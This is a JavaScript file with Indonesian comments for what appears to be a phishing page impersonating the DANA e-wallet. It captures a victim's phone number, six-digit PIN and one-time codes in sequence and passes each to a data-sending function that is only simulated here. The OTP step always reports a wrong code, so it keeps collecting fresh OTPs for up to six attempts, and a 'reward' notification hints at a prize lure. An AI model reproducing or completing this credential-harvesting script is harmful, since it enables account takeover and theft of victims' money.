document.addEventListener('DOMContentLoaded', () => {
  // Debugging: Log bahwa DOM telah dimuat
  console.log('DOM fully loaded and parsed');

  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const rn = document.getElementById('reward-notification');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const lc = document.getElementById('lanjutkan-container');

  // Debugging: Log elemen yang ditemukan
  console.log('Elements found:', { pages, lb, pn, pis, ois, fn, sn, rn, ac, an, lc });

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  const maxAttempts = 6;
  let otpTimer;

  // Debugging: Log state awal
  console.log('Initial state:', { currentPage, phoneNumber, pin, otp, attemptCount });

  // Helper Functions
  function showSpinner() {
    console.log('Showing spinner');
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideSpinner() {
    console.log('Hiding spinner');
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function startOTPTimer() {
    console.log('Starting OTP timer');
    let timeLeft = 120;
    const timerElement = document.getElementById('otp-timer');
    
    otpTimer = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      
      if (timeLeft <= 0) {
        clearInterval(otpTimer);
        console.log('OTP timer expired');
      }
      timeLeft--;
    }, 1000);
  }

  function resetOTPInputs() {
    console.log('Resetting OTP inputs');
    ois.forEach(input => input.value = '');
    ois[0].focus();
    otp = '';
    attemptCount++;
    an.textContent = attemptCount;
    ac.style.display = 'block';
    console.log('Attempt count:', attemptCount);
  }

  function switchPage(from, to) {
    console.log(`Switching page from ${from} to ${to}`);
    pages[from].style.display = 'none';
    pages[to].style.display = 'block';
    currentPage = to;
    console.log('Current page after switch:', currentPage);
  }

  // Backend Communication (simulated)
  async function sendDanaData(type, data) {
    console.log(`Sending data to backend - Type: ${type}, Data:`, data);
    
    // Simulate API delay
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Simulate successful response
    return { success: true };
  }

  // Phone Number Input Handling
  pn.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.startsWith('0')) {
      value = value.substring(1);
    }
    
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.replace(/^8/, '');
    }
    
    if (value.length > 13) {
      value = value.substring(0, 13);
    }
    
    let formatted = '';
    if (value.length > 0) {
      formatted = value.substring(0, 4);
      if (value.length > 4) {
        formatted += '-' + value.substring(4, 8);
      }
      if (value.length > 8) {
        formatted += '-' + value.substring(8, 13);
      }
    }
    
    e.target.value = formatted;
    phoneNumber = value;
    console.log('Formatted phone number:', formatted, 'Raw:', phoneNumber);
  });

  // Continue Button Handler
  lb.addEventListener('click', async () => {
    console.log('Continue button clicked on page:', currentPage);
    
    if (currentPage === 'n') {
      if (phoneNumber.length < 10) {
        console.log('Invalid phone number length:', phoneNumber.length);
        alert('Nomor HP harus minimal 10 digit');
        return;
      }
      
      showSpinner();
      try {
        console.log('Sending phone number:', phoneNumber);
        await sendDanaData('phone', { phone: phoneNumber });
        switchPage('n', 'p');
        lc.style.display = 'none';
      } catch (error) {
        console.error('Error sending phone number:', error);
        alert('Gagal mengirim data: ' + error.message);
      } finally {
        hideSpinner();
      }
    }
  });

  // PIN Input Handling
  pis.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
      
      pin = Array.from(pis).map(i => i.value).join('');
      console.log('Current PIN:', pin);
      
      if (pin.length === 6) {
        showSpinner();
        try {
          console.log('Sending PIN:', pin);
          await sendDanaData('pin', { phone: phoneNumber, pin });
          switchPage('p', 'o');
          lc.style.display = 'none';
          startOTPTimer();
          setTimeout(() => {
            fn.style.display = 'block';
            console.log('Showing floating notification');
          }, 1000);
        } catch (error) {
          console.error('Error sending PIN:', error);
          alert('Gagal mengirim PIN: ' + error.message);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  // OTP Input Handling
  ois.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < ois.length - 1) {
        ois[index + 1].focus();
      }
      
      otp = Array.from(ois).map(i => i.value).join('');
      console.log('Current OTP:', otp);
      
      if (index === ois.length - 1 && e.target.value.length === 1) {
        showSpinner();
        try {
          console.log('Sending OTP:', otp);
          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
          
          setTimeout(() => {
            resetOTPInputs();
            
            if (attemptCount > 2) {
              console.log('Showing reward notification (attempt > 2)');
              rn.style.display = 'block';
              rn.innerHTML = `
                <div class="notification-content">
                  <h3>kode OTP Salah</h3>
                  <p>silahkan cek sms ataupan whatsapp</p>
                </div>
              `;
              setTimeout(() => {
                rn.style.display = 'none';
                console.log('Hiding reward notification');
              }, 10000);
            }
            
            if (attemptCount >= maxAttempts) {
              console.log('Max attempts reached, showing success notification');
              fn.style.display = 'none';
              sn.style.display = 'block';
              setTimeout(() => {
                sn.style.display = 'none';
                console.log('Hiding success notification');
              }, 5000);
            }
          }, 1000);
        } catch (error) {
          console.error('Error sending OTP:', error);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        ois[index - 1].focus();
      }
    });
  });

  // Toggle PIN Visibility
  document.querySelector('.show-text').addEventListener('click', (e) => {
    const isShowing = e.target.classList.toggle('active');
    const pinInputs = document.querySelectorAll('.pin-box');
    pinInputs.forEach(input => {
      input.type = isShowing ? 'text' : 'password';
    });
    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
    console.log('PIN visibility toggled:', isShowing ? 'visible' : 'hidden');
  });

  // Debugging: Log bahwa semua event listener telah terpasang
  console.log('All event listeners attached');
});
